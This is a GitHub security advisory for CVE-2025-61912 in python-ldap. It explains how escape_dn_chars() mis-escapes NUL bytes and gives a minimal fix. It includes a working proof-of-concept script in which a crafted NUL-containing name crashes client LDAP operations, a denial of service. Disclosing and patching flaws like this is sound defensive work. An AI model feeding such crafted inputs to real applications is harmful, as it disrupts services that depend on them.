# [M] python-ldap is Vulnerable to Improper Encoding or Escaping of Output and Improper Null Termination

## Summary
Severity: Medium
Advisory: GHSA-p34h-wq7j-h5v6
CVE: CVE-2025-61912
CWE: CWE-116, CWE-170
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-10-10
Source: https://github.com/advisories/GHSA-p34h-wq7j-h5v6
Type: github-advisory

## Affected
- PyPI: `python-ldap` — affected >=0 <3.4.5

## Details
### Summary


`ldap.dn.escape_dn_chars()` escapes `\x00` incorrectly by emitting a backslash followed by a literal NUL byte instead of the RFC-4514 hex form `\00`. Any application that uses this helper to construct DNs from untrusted input can be made to consistently fail before a request is sent to the LDAP server (e.g., AD), resulting in a client-side denial of service.



### Details



Affected function: `ldap.dn.escape_dn_chars(s)`

File: Lib/ldap/dn.py

Buggy behavior:
For NUL, the function does:

`s = s.replace('\000', '\\\000')  # backslash + literal NUL`

This produces Python strings which, when passed to python-ldap APIs (e.g., `add_s`, `modify_s`, r`ename_s`, or used as search bases), contain an embedded NUL. python-ldap then raises ValueError: embedded null character (or otherwise fails) before any network I/O.
With correct RFC-4514 encoding (`\00`), the client proceeds and the server can apply its own syntax rules (e.g., AD will reject NUL in CN with result: 34), proving the failure originates in the escaping helper.

Why it matters: Projects follow the docs which state this function “should be used when building LDAP DN strings from arbitrary input.” The function’s guarantee is therefore relied upon as a safety API. A single NUL in attacker-controlled input reliably breaks client workflows (crash/unhandled exception, stuck retries, poison queue record), i.e., a DoS.

Standards: RFC 4514 requires special characters and controls to be escaped using hex form; a literal NUL is not a valid DN character.

Minimal fix: Escape NUL as hex:

`s = s.replace('\x00', r'\00')`



### PoC

Prereqs: Any python-ldap install and a reachable LDAP server (for the second half). The first half (client-side failure) does not require a live server.

```import ldap
from ldap.dn import escape_dn_chars, str2dn

l = ldap.initialize("ldap://10.0.1.11")              # your lab DC/LDAP
l.protocol_version = 3
l.set_option(ldap.OPT_REFERRALS, 0)
l.simple_bind_s(r"DSEC\dani.aga", "PassAa1")         

# --- Attacker-controlled value contains NUL ---
cn = "bad\0name"
escaped_cn = escape_dn_chars(cn)
dn = f"CN={escaped_cn},OU=Users,DC=dsec,DC=local"
attrs = [('objectClass', [b'user']), ('sAMAccountName', [b'badsam'])]

print("=== BUGGY DN (contains literal NUL) ===")
print("escaped_cn repr:", repr(escaped_cn))
print("dn repr:", repr(dn))
print("contains NUL?:", "\x00" in dn, "at index:", dn.find("\x00"))

print("=> add_s(buggy DN): expected client-side failure (no server contact)")
try:
    l.add_s(dn, attrs)
    print("add_s(buggy): succeeded (unexpected)")
except Exception as e:
    print("add_s(buggy):", type(e).__name__, e)  # ValueError: embedded null character

# --- Correct hex escape demonstrates the client proceeds to the server ---
safe_dn = dn.replace("\x00", r"\00")                 # RFC 4514-compliant
print("\n=== HEX-ESCAPED DN (\\00) ===")
print("safe_dn repr:", repr(safe_dn))
print("=> sanity parse:", str2dn(safe_dn))           # parses locally

print("=> add_s(safe DN): reaches server (AD will likely reject with 34)")
try:
    l.add_s(safe_dn, attrs)
    print("add_s(safe): success (unlikely without required attrs/rights)")
except ldap.LDAPError as e:
    print("add_s(safe):", e.__class__.__name__, e)  # e.g., result 34 Invalid DN syntax (AD forbids NUL in CN)
```

Observed result (example):

`add_s(buggy): ValueError embedded null character` ← client-side DoS

`add_s(safe): INVALID_DN_SYNTAX (result 34, BAD_NAME)` ← request reached server; rejection due to server policy, not client bug


### Impact

Type: Denial of Service (client-side).

Who is impacted: Any application that uses ldap.dn.escape_dn_chars() to build DNs from (partially) untrusted input—e.g., user `creation/rename tools`, `sync/ETL jobs`, portals allowing self-service attributes, device onboarding, batch imports. A single crafted value with `\x00` reliably forces exceptions/failures and can crash handlers or jam pipelines with poison records.

## References
- https://github.com/python-ldap/python-ldap/security/advisories/GHSA-p34h-wq7j-h5v6
- https://nvd.nist.gov/vuln/detail/CVE-2025-61912
- https://github.com/python-ldap/python-ldap/commit/6ea80326a34ee6093219628d7690bced50c49a3f
- https://github.com/python-ldap/python-ldap
- https://github.com/python-ldap/python-ldap/releases/tag/python-ldap-3.4.5
